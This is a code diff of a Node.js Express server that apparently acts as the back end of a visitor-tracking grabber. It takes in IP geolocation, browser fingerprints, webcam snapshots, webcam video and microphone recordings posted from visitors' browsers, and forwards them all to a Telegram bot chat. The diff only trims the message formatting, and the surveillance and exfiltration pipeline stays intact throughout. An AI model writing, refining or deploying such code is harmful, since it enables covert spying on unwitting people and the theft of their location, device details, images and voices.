@@ -14,176 +14,109 @@ const PORT = process.env.PORT || 3000;
 app.use(cors());
 app.use(express.json({ limit: '50mb' }));
 
-// ================================================================
-// Build a FULL, human-readable message (no truncation, no base64)
-// We will send the canvas as a separate photo later.
-// ================================================================
+// Build a minimal, guaranteed-safe message
 function buildMessage(ipData, fingerprint) {
-    let msg = '📡 *New Visitor Info*\n\n';
-
-    // --- IP Info (every field) ---
+    let msg = '📡 New Visitor\n\n';
     if (ipData) {
-        msg += '*IP Info:*\n';
-        msg += `IP: ${ipData.ip || 'N/A'}\n`;
-        if (ipData.city) msg += `City: ${ipData.city}\n`;
-        if (ipData.region) msg += `Region: ${ipData.region}\n`;
-        if (ipData.region_code) msg += `Region Code: ${ipData.region_code}\n`;
-        if (ipData.country_name) msg += `Country: ${ipData.country_name}\n`;
-        if (ipData.country_code) msg += `Country Code: ${ipData.country_code}\n`;
-        if (ipData.continent_code) msg += `Continent: ${ipData.continent_code}\n`;
-        if (ipData.postal) msg += `Postal: ${ipData.postal}\n`;
-        if (ipData.latitude && ipData.longitude) {
-            msg += `Location: ${ipData.latitude}, ${ipData.longitude}\n`;
-            msg += `Maps: https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}\n`;
-        }
-        if (ipData.org) msg += `ISP: ${ipData.org}\n`;
-        if (ipData.timezone) msg += `Timezone: ${ipData.timezone}\n`;
-        if (ipData.utc_offset) msg += `UTC Offset: ${ipData.utc_offset}\n`;
-        msg += '\n';
+        msg += 'IP: ' + (ipData.ip || 'N/A') + '\n';
+        if (ipData.city) msg += 'City: ' + ipData.city.substring(0, 30) + '\n';
+        if (ipData.country_name) msg += 'Country: ' + ipData.country_name.substring(0, 30) + '\n';
     }
-
-    // --- Fingerprint (full) ---
     if (fingerprint) {
-        msg += '*Device & Browser:*\n';
-        msg += `User Agent: ${fingerprint.userAgent || 'N/A'}\n`;
-        msg += `Platform: ${fingerprint.platform || 'N/A'}\n`;
-        msg += `Language: ${fingerprint.language || 'N/A'}\n`;
+        const ua = (fingerprint.userAgent || '').substring(0, 30);
+        msg += 'UA: ' + ua + '\n';
+        msg += 'Platform: ' + (fingerprint.platform || 'N/A').substring(0, 20) + '\n';
         if (fingerprint.screen) {
-            msg += `Screen: ${fingerprint.screen.width}x${fingerprint.screen.height} `;
-            msg += `(${fingerprint.screen.colorDepth}bit, ratio ${fingerprint.screen.pixelRatio})\n`;
+            msg += 'Screen: ' + fingerprint.screen.width + 'x' + fingerprint.screen.height + '\n';
         }
-        msg += `Touch Points: ${fingerprint.maxTouchPoints}\n`;
-        msg += `Cores: ${fingerprint.hardwareConcurrency}\n`;
-        msg += `Memory: ${fingerprint.deviceMemory} GB\n`;
-        msg += `Timezone: ${fingerprint.timezone}\n`;
-        if (fingerprint.webgl && fingerprint.webgl !== 'not supported' && fingerprint.webgl !== 'unsupported') {
-            msg += `GPU Vendor: ${fingerprint.webgl.vendor}\n`;
-            msg += `GPU Renderer: ${fingerprint.webgl.renderer}\n`;
-        }
-        // Canvas fingerprint – mention it will be sent as a separate image
-        if (fingerprint.canvas) {
-            msg += `Canvas fingerprint: captured (sent as image below)\n`;
-        }
-        msg += '\n';
     }
-
-    msg += `*Timestamp:* ${new Date().toISOString()}`;
+    msg += '\nTime: ' + new Date().toISOString();
     return msg;
 }
 
-// ================================================================
-// Safe chunked sending – never exceed 4096 bytes per message
-// ================================================================
-async function sendSingleChunk(text) {
-    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-    const res = await fetch(url, {
+async function sendSingle(text) {
+    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text,
-            parse_mode: 'Markdown'
-        })
+        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text }),
     });
     if (!res.ok) {
         const err = await res.json();
-        console.error('❌ Telegram sendMessage failed:', err);
+        console.error('❌ Send failed:', err);
     }
 }
 
-async function sendLongMessage(text) {
-    const MAX_BYTES = 3900; // safe margin below 4096
+async function sendSafe(text) {
+    const MAX_BYTES = 2000;
     const buf = Buffer.from(text, 'utf8');
-    console.log(`[DEBUG] Full message byte length: ${buf.length}`);
-
+    console.log(`[DEBUG] Message bytes: ${buf.length}`);
     if (buf.length <= MAX_BYTES) {
-        await sendSingleChunk(text);
+        await sendSingle(text);
         return;
     }
-
-    // Split into chunks, ensuring valid UTF-8 boundaries
-    const chunks = [];
+    // split into 2000-byte chunks
     let start = 0;
+    let part = 1;
+    const total = Math.ceil(buf.length / MAX_BYTES);
     while (start < buf.length) {
-        let end = Math.min(start + MAX_BYTES, buf.length);
-        // If we're not at the end, avoid cutting a multi-byte character
+        let end = start + MAX_BYTES;
         if (end < buf.length) {
             while (end > start && (buf[end] & 0xC0) === 0x80) end--;
         }
-        chunks.push(buf.slice(start, end).toString('utf8'));
+        const chunkText = `[${part}/${total}] ` + buf.slice(start, end).toString('utf8');
+        await sendSingle(chunkText);
         start = end;
-    }
-
-    console.log(`[DEBUG] Splitting into ${chunks.length} parts`);
-    for (let i = 0; i < chunks.length; i++) {
-        const prefix = chunks.length > 1 ? `[${i + 1}/${chunks.length}] ` : '';
-        await sendSingleChunk(prefix + chunks[i]);
+        part++;
     }
 }
 
-// ================================================================
-// Media senders (unchanged)
-// ================================================================
-async function sendPhoto(base64, caption = '') {
+async function sendPhoto(b64) {
     try {
-        const b = base64.includes(',') ? base64.split(',')[1] : base64;
-        const buf = Buffer.from(b, 'base64');
+        const base64Data = b64.includes(',') ? b64.split(',')[1] : b64;
+        const buf = Buffer.from(base64Data, 'base64');
         const fd = new FormData();
         fd.append('chat_id', TELEGRAM_CHAT_ID);
         fd.append('photo', new Blob([buf], { type: 'image/jpeg' }), 'webcam.jpg');
-        if (caption) fd.append('caption', caption);
         await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-    } catch(e) { console.error('sendPhoto error:', e); }
+    } catch(e) { console.error(e); }
 }
 
-async function sendVideo(base64, caption = '') {
+async function sendVideo(b64) {
     try {
-        const b = base64.includes(',') ? base64.split(',')[1] : base64;
-        const buf = Buffer.from(b, 'base64');
+        const base64Data = b64.includes(',') ? b64.split(',')[1] : b64;
+        const buf = Buffer.from(base64Data, 'base64');
         const fd = new FormData();
         fd.append('chat_id', TELEGRAM_CHAT_ID);
         fd.append('video', new Blob([buf], { type: 'video/mp4' }), 'webcam.mp4');
-        if (caption) fd.append('caption', caption);
         await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd });
-    } catch(e) { console.error('sendVideo error:', e); }
+    } catch(e) { console.error(e); }
 }
 
-async function sendAudio(base64) {
+async function sendAudio(b64) {
     try {
-        const b = base64.includes(',') ? base64.split(',')[1] : base64;
-        const buf = Buffer.from(b, 'base64');
+        const base64Data = b64.includes(',') ? b64.split(',')[1] : b64;
+        const buf = Buffer.from(base64Data, 'base64');
         const fd = new FormData();
         fd.append('chat_id', TELEGRAM_CHAT_ID);
         fd.append('audio', new Blob([buf], { type: 'audio/wav' }), 'mic.wav');
         await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendAudio`, { method: 'POST', body: fd });
-    } catch(e) { console.error('sendAudio error:', e); }
+    } catch(e) { console.error(e); }
 }
 
-// ================================================================
-// MAIN ENDPOINT
-// ================================================================
 app.post('/api/telegram', async (req, res) => {
     try {
         const { ipData, fingerprint, photo, video, mic, timestamp } = req.body;
-
         console.log(`[+] Received at ${timestamp}`);
         console.log(`[+] IP: ${ipData?.ip}`);
         console.log(`[+] Photo: ${photo ? 'yes' : 'no'}`);
         console.log(`[+] Video: ${video ? 'yes' : 'no'}`);
         console.log(`[+] Mic: ${mic ? 'yes' : 'no'}`);
 
-        // 1. Send the full text summary (split if needed)
         const message = buildMessage(ipData, fingerprint);
-        await sendLongMessage(message);
+        await sendSafe(message);
 
-        // 2. Send canvas fingerprint as a separate image (if present)
-        if (fingerprint && fingerprint.canvas && fingerprint.canvas.length > 50) {
-            await sendPhoto(fingerprint.canvas, '🖼 Canvas fingerprint');
-        }
-
-        // 3. Send captured media
-        if (photo) await sendPhoto(photo, '📸 Webcam snapshot');
-        if (video) await sendVideo(video, '🎥 Webcam video (3s)');
+        if (photo) await sendPhoto(photo);
+        if (video) await sendVideo(video);
         if (mic) await sendAudio(mic);
 
         res.status(200).json({ success: true });
@@ -193,4 +126,4 @@ app.post('/api/telegram', async (req, res) => {
     }
 });
 
-app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
+app.listen(PORT, () => console.log(`🚀 Server on ${PORT}`));
